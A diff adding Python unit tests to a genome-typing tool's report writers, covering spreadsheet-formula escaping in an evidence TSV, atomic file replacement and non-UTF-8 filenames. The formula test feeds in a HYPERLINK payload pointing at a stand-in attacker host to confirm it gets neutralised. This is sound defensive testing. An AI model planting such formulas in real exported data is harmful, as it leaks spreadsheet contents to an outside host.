@@ -510,6 +510,150 @@ def test_evidence_tsv_includes_failed_samples():
     assert "bad.fa" in text and "failed" in text
 
 
+def test_evidence_tsv_neutralises_spreadsheet_formulas():
+    # Finding 24: a contig id, a filename or a failure string that starts with
+    # =, +, -, @, TAB or CR is executed as a formula the moment the evidence
+    # table is opened in Excel or LibreOffice. print_row's quoting is consumed
+    # AS quoting by the spreadsheet, so it is not a mitigation; only a leading
+    # apostrophe is. WMLST-only surface, so changing these bytes is allowed.
+    import tempfile
+    payload = '=HYPERLINK("http://evil.example/"&A1,"OpenMe")'
+    hit = mk_hit(qseqid=payload)
+    call = AlleleCall(locus="arcC", code="16", symbol="exact", best=hit, hits=(hit,))
+    sample = SampleResult(path="@x.fna", label="@x.fna", scheme="sepidermidis",
+                          st="184", signature="16", score=100, status="PERFECT",
+                          alleles=(call,))
+    bad = mk_sample("-oops.fa", "-", "-", "NONE", 0, failed=True,
+                    error_text="+1+1")
+    result = mk_result([sample, bad], RunConfig())
+    with tempfile.TemporaryDirectory() as tmp:
+        out = os.path.join(tmp, "e.tsv")
+        report.write_evidence_tsv(result, out)
+        lines = open(out, encoding="utf-8").read().splitlines()
+    row = lines[1].split("\t")
+    assert row[0] == "'@x.fna"
+    assert row[6] == '"\'=HYPERLINK(""http://evil.example/""&A1,""OpenMe"")"'
+    failed_row = lines[2].split("\t")
+    assert failed_row[0] == "'-oops.fa"
+    assert failed_row[6] == "'+1+1"
+    # The guard must not spread to the structural or numeric columns: the "-"
+    # placeholders and the coordinates stay exactly as they were.
+    assert failed_row[1:6] == ["-", "-", "-", "failed", "-"]
+    assert row[7] == "100" and row[11] == "465" and row[13] == "100.0"
+
+
+def test_evidence_tsv_leaves_ordinary_fields_untouched():
+    import tempfile
+    hit = mk_hit()
+    call = AlleleCall(locus="arcC", code="16", symbol="exact", best=hit, hits=(hit,))
+    sample = SampleResult(path="example.fna", label="example.fna",
+                          scheme="sepidermidis", st="184", signature="16",
+                          score=100, status="PERFECT", alleles=(call,))
+    result = mk_result([sample], RunConfig())
+    with tempfile.TemporaryDirectory() as tmp:
+        out = os.path.join(tmp, "e.tsv")
+        report.write_evidence_tsv(result, out)
+        text = open(out, encoding="utf-8").read()
+    assert "'" not in text
+
+
+def test_sheet_safe_guard_never_reaches_the_compat_surfaces():
+    # print_row and write_tsv are byte-locked to bin/mlst:417-428; the formula
+    # guard must never appear there or --csv/--full/--legacy would diverge.
+    buf = io.StringIO()
+    report.print_row(["=cmd", "-1", "@x", "+2"], ",", buf)
+    assert buf.getvalue() == "=cmd,-1,@x,+2\n"
+    result = mk_result([mk_sample("=evil.fna", *EXAMPLE)], RunConfig(csv=True))
+    assert tsv(result).startswith("=evil.fna,")
+    assert report.json_text(result).count('"=evil.fna"') == 2  # id + filename
+    assert "'=evil.fna" not in report.json_text(result)
+
+
+def test_report_writers_keep_the_previous_file_when_the_write_fails():
+    # Finding 26: --json/--novel/--evidence-tsv truncated the destination with
+    # open(path, "w") before they had the bytes, so an ENOSPC-class failure
+    # destroyed the user's previous file and left a half-written one. All four
+    # writers now stage into path + ".tmp" and rename.
+    import tempfile
+    hit = mk_hit()
+    call = AlleleCall(locus="arcC", code="16", symbol="exact", best=hit, hits=(hit,))
+    sample = SampleResult(path="x.fa", label="x.fa", scheme="sepidermidis", st="184",
+                          signature="16", score=100, status="PERFECT", alleles=(call,))
+    novel = novel_from_golden("messy_novel.fa")[:1]
+    result = mk_result([sample], RunConfig(), novel=novel)
+
+    real_replace = os.replace
+
+    def boom(src, dst):
+        raise OSError(27, "File too large")
+
+    writers = [report.write_json, report.write_novel_fasta, report.write_evidence_tsv]
+    for writer in writers:
+        with tempfile.TemporaryDirectory() as tmp:
+            out = os.path.join(tmp, "prev.out")
+            with open(out, "w", encoding="utf-8") as fh:
+                fh.write("PREVIOUS")
+            report.os.replace = boom
+            try:
+                writer(result, out)
+            except OSError:
+                pass
+            else:
+                raise AssertionError("%s swallowed the failure" % writer.__name__)
+            finally:
+                report.os.replace = real_replace
+            assert open(out, encoding="utf-8").read() == "PREVIOUS", writer.__name__
+            assert not os.path.exists(out + ".tmp"), writer.__name__
+
+
+def test_report_writers_still_produce_the_same_bytes_they_always_did():
+    # The staging must be invisible: identical content, no leftover tmp.
+    import tempfile
+    novel = novel_from_golden("messy_novel.fa")
+    result = mk_result([mk_sample("x.fa", *NONE)], RunConfig(), novel=novel)
+    with tempfile.TemporaryDirectory() as tmp:
+        out = os.path.join(tmp, "n.fa")
+        report.write_novel_fasta(result, out)
+        assert not os.path.exists(out + ".tmp")
+        with open(out, encoding="utf-8", newline="") as fh:
+            assert fh.read() == read_golden("messy_novel.fa")
+        assert report.novel_fasta_text(result) == read_golden("messy_novel.fa")
+        js = os.path.join(tmp, "r.json")
+        report.write_json(result, js)
+        assert open(js, encoding="utf-8").read() == report.json_text(result)
+        assert not os.path.exists(js + ".tmp")
+
+
+def test_writers_survive_a_filename_that_is_not_valid_utf8():
+    # Finding 9: os.fsdecode() turns an undecodable byte into a PEP 383 lone
+    # surrogate, which a strict UTF-8 writer cannot encode at all. Neither
+    # WMLST-only nor compat file writers may die on it after a finished run.
+    import tempfile
+    label = "bad\udcff\udcfename.fna"
+    hit = mk_hit(qseqid="c\udcff1")
+    call = AlleleCall(locus="arcC", code="16", symbol="exact", best=hit, hits=(hit,))
+    sample = SampleResult(path=label, label=label, scheme="sepidermidis", st="184",
+                          signature="16", score=100, status="PERFECT", alleles=(call,))
+    base = novel_from_golden("messy_novel.fa")[0]
+    novel = [NovelAllele(scheme=base.scheme, locus=base.locus, md5=base.md5,
+                         seq=base.seq, source_label=label, fasta_id=base.fasta_id,
+                         nearest_allele=base.nearest_allele, length_bp=base.length_bp)]
+    result = mk_result([sample], RunConfig(), novel=novel)
+    with tempfile.TemporaryDirectory() as tmp:
+        ev = os.path.join(tmp, "e.tsv")
+        report.write_evidence_tsv(result, ev)           # must not raise
+        assert open(ev, "rb").read().count(b"\n") == 2
+        js = os.path.join(tmp, "r.json")
+        report.write_json(result, js)                   # ensure_ascii keeps it clean
+        assert "\\udcff" in open(js, encoding="utf-8").read()
+        fa = os.path.join(tmp, "n.fa")
+        report.write_novel_fasta(result, fa)            # must not raise
+        # surrogateescape reproduces Perl's raw Path::Tiny spew byte for byte.
+        assert b"bad\xff\xfename.fna" in open(fa, "rb").read()
+        for path in (ev, js, fa):
+            assert not os.path.exists(path + ".tmp")
+
+
 def test_inexact_percentages_are_floored_not_rounded():
     # C14: an inexact call must never print 100.0 %.
     assert report._pct_text(99.99, exact=False) == "99.9"
